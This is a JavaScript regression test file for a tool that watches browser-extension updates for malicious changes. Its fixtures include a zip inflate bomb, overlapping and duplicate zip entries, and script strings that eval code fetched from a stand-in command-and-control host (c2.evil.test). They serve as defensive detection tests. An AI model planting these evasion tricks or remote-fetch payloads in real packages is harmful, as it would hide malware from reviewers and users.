// Regression tests for the findings of the independent security review (2026-10-30).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { deflateRawSync } from 'node:zlib';
import { listZip, readEntry } from '../src/lib/zip.js';
import { buildSnapshot, MAX_SNAPSHOT_BYTES } from '../src/lib/snapshot.js';
import { compareSnapshots } from '../src/lib/diff.js';
import { createMonitor } from '../src/lib/monitor.js';
import { makeZip, makeCrx3, fakeId } from './helpers/pack.js';

const manifest = (v, extra = {}) => JSON.stringify({ manifest_version: 3, name: 'X', version: v, ...extra });

test('inflate bomb hidden under a small declared size stops at once (review #2)', () => {
  const huge = new Uint8Array(64 * 1024 * 1024); // 64 MB of zeros, ~64 KB deflated
  const zip = makeZip([{ name: 'tiny.js', data: huge, declaredSize: 100 }]);
  const { entries } = listZip(zip);
  const t0 = performance.now();
  const r = readEntry(zip, entries[0]);
  const ms = performance.now() - t0;
  assert.equal(r.skipped, 'size-mismatch');
  assert.ok(ms < 500, `took ${ms.toFixed(0)} ms`);
});

test('entries sharing one local header are not unpacked twice (review #2)', () => {
  const zip = makeZip([{ name: 'a.js', data: 'x' }, { name: 'b.js', data: 'y' }]);
  // Point the second central entry at the first local header.
  const buf = Buffer.from(zip);
  const cd = buf.readUInt32LE(buf.length - 22 + 16);
  const secondCen = cd + 46 + 'a.js'.length;
  buf.writeUInt32LE(0, secondCen + 42);
  const { entries, warnings } = listZip(new Uint8Array(buf));
  assert.ok(warnings.some((w) => w.startsWith('path:overlap:')));
  assert.equal(readEntry(new Uint8Array(buf), entries[1]).skipped, 'overlap');
});

test('duplicate names: the last copy (the one Chrome installs) is analysed, and scored (review #4)', async () => {
  const id = fakeId('dup');
  const old = await buildSnapshot(makeZip([{ name: 'manifest.json', data: manifest('1') }, { name: 'bg.js', data: 'ok()' }]));
  const evil = makeZip([
    { name: 'manifest.json', data: manifest('2') },
    { name: 'bg.js', data: 'ok()' },
    { name: 'bg.js', data: 'eval(fetch("https://c2.evil.test/x"))' },
    { name: 'Lib.js', data: '1' },
    { name: 'lib.js', data: '2' },
  ]);
  const snap = await buildSnapshot(makeCrx3(evil, id), { id });
  assert.ok(snap.patterns.eval, 'the later bg.js was scanned');
  assert.deepEqual(snap.hosts, ['c2.evil.test']);
  const r = compareSnapshots(old, snap);
  const tricks = r.findings.find((f) => f.code === 'f_zip_tricks');
  assert.ok(tricks && tricks.points >= 30);
  assert.ok(tricks.items.some((x) => x.startsWith('duplicate:')));
  assert.ok(tricks.items.some((x) => x.startsWith('case-collision:')));
});

test('code that could not be scanned scores points (review #5)', async () => {
  const old = await buildSnapshot(makeZip([{ name: 'manifest.json', data: manifest('1') }]));
  const next = await buildSnapshot(makeZip([{ name: 'manifest.json', data: manifest('2') }, { name: 'payload.js', data: new Uint8Array(2000), declaredSize: 70 * 1024 * 1024 }]));
  const r = compareSnapshots(old, next);
  const f = r.findings.find((x) => x.code === 'f_unscanned_code');
  assert.ok(f && f.points > 0);
  assert.deepEqual(f.items, ['payload.js']);
});

test('a C2 host cannot hide behind a dense data file listed first (review #6)', async () => {
  const filler = Array.from({ length: 60 }, (_, i) => `"https://site${i}.example-list.test/"`).join(',');
  const old = await buildSnapshot(makeZip([{ name: 'manifest.json', data: manifest('1') }, { name: 'a-list.js', data: `[${filler}]` }]));
  const next = await buildSnapshot(
    makeZip([
      { name: 'manifest.json', data: manifest('2') },
      { name: 'a-list.js', data: `[${filler},"https://c2.evil.test/"]` },
      { name: 'z-bg.js', data: 'fetch("https://c2.evil.test/cmd")' },
    ]),
  );
  assert.equal(next.hostSources['c2.evil.test'], 'z-bg.js');
  const r = compareSnapshots(old, next);
  assert.ok(r.findings.some((f) => f.code === 'f_sites_new' && f.items.includes('evil.test')));
});

test('a package built to exhaust storage is refused (review #3)', async () => {
  const files = [{ name: 'manifest.json', data: manifest('1') }];
  for (let i = 0; i < 6000; i++) files.push({ name: `d/${'x'.repeat(400)}${i}.txt`, data: '' });
  await assert.rejects(buildSnapshot(makeZip(files)), { code: 'summary-too-large' });
  assert.ok(MAX_SNAPSHOT_BYTES <= 2 * 1024 * 1024);
});

function memStore() {
  const data = new Map();
  return {
    data,
    async get(k) {
      if (k === null) return Object.fromEntries(data);
      const o = {};
      for (const x of [].concat(k)) if (data.has(x)) o[x] = structuredClone(data.get(x));
      return o;
    },
    async set(o) {
      for (const [k, v] of Object.entries(o)) data.set(k, structuredClone(v));
    },
    async remove(k) {
      for (const x of [].concat(k)) data.delete(x);
    },
  };
}

test('an update whose package cannot be analysed is reported as high risk, not skipped (review #1)', async () => {
  const id = fakeId('unreadable');
  const st = memStore();
  const state = { version: '1.0', bytes: makeCrx3(makeZip([{ name: 'manifest.json', data: manifest('1.0') }]), id) };
  const reports = [];
  const disabled = [];
  st.data.set('settings', { autoDisable: true });
  const m = createMonitor({
    storage: st,
    selfId: fakeId('self'),
    management: {
      getAll: async () => [{ id, name: 'X', version: state.version, type: 'extension', installType: 'normal', enabled: true, mayDisable: true, permissions: [], hostPermissions: [] }],
      setEnabled: async (x, on) => disabled.push([x, on]),
    },
    download: async () => state.bytes,
    onReport: (r) => reports.push(r),
  });
  await m.checkAll();
  state.version = '2.0';
  state.bytes = new Uint8Array([0x43, 0x72, 0x32, 0x34, 7, 0, 0, 0]); // unsupported CRX version
  await m.checkAll();
  assert.equal(reports.length, 1);
  assert.equal(reports[0].level, 'high');
  assert.equal(reports[0].findings[0].code, 'f_unanalysable');
  assert.deepEqual(disabled, [[id, false]]);
  // Reported once, not on every run.
  await m.checkAll();
  assert.equal(reports.length, 1);
});

test('the user is notified even when the report cannot be stored (review #1)', async () => {
  const id = fakeId('full-disk');
  const st = memStore();
  let full = false;
  const realSet = st.set.bind(st);
  st.set = async (o) => {
    if (full && Object.keys(o).some((k) => k.startsWith('report:'))) throw new Error('QUOTA_BYTES quota exceeded');
    return realSet(o);
  };
  const pkg = (v, extra) => makeCrx3(makeZip([{ name: 'manifest.json', data: manifest(v, extra) }]), id);
  const state = { version: '1', bytes: pkg('1') };
  const reports = [];
  const m = createMonitor({
    storage: st,
    selfId: fakeId('self'),
    management: { getAll: async () => [{ id, name: 'X', version: state.version, type: 'extension', installType: 'normal', enabled: true }], setEnabled: async () => {} },
    download: async () => state.bytes,
    onReport: (r) => reports.push(r),
  });
  await m.checkAll();
  full = true;
  state.version = '2';
  state.bytes = pkg('2', { permissions: ['debugger'] });
  await m.checkAll();
  assert.equal(reports.length, 1);
});

test('stored deflate data is still read correctly in small chunks', () => {
  const text = 'abc'.repeat(100000);
  const zip = makeZip([{ name: 'big.js', data: text }]);
  const { entries } = listZip(zip);
  assert.equal(new TextDecoder().decode(readEntry(zip, entries[0]).data), text);
  assert.ok(deflateRawSync(Buffer.from(text)).length < text.length);
});
